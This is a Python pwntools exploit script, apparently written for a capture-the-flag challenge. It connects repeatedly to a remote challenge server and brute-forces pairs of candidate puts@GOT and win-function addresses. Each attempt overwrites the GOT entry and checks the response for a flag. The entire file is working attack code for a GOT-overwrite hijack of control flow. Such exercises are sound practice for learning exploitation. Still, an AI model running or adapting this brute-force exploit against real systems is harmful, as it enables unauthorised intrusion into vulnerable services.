#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'
context.arch = 'amd64'

# From "have" binary analysis:
# puts@GOT = 0x403430
# win = 0x401236
# Let's try these and variations

# GOT candidates around 0x4034xx and 0x4040xx
puts_got_candidates = [
    0x403430,  # From have binary
    0x403428, 0x403438, 0x403420, 0x403440,  # Nearby
    0x404000, 0x404008, 0x404018, 0x404020,  # Standard 64-bit
    0x403018, 0x403020, 0x403028, 0x403030, 0x403038,  # Other patterns
]

# Win function candidates
win_candidates = [
    0x401236,  # From have binary
    0x401196, 0x4011a6, 0x4011b6, 0x4011c6, 0x4011d6,  # Other possible win
    0x401200, 0x401210, 0x401220, 0x401230, 0x401240, 0x401250,
    0x401176, 0x401186, 0x401156, 0x401166,
]

print(f"Scanning {len(puts_got_candidates)} GOT x {len(win_candidates)} win addresses")

for puts_got in puts_got_candidates:
    for win_func in win_candidates:
        try:
            p = remote("chall.0xfun.org", 61453, timeout=2)
            p.recvuntil(b"Show me what you GOT!", timeout=3)
            p.sendline(str(puts_got).encode())
            p.recvuntil(b"Show me what you GOT! I want to see what you GOT!", timeout=3)
            p.sendline(str(win_func).encode())
            
            response = p.recvall(timeout=1)
            if len(response) > 10 or b"{" in response:
                print(f"[HIT] GOT=0x{puts_got:x}, win=0x{win_func:x}")  
                print(f"Response: {response}")
                if b"0xfun" in response or b"flag" in response.lower():
                    print("\n**FLAG FOUND!**")
                    exit(0)
            p.close()
        except:
            pass

print("\nDone")
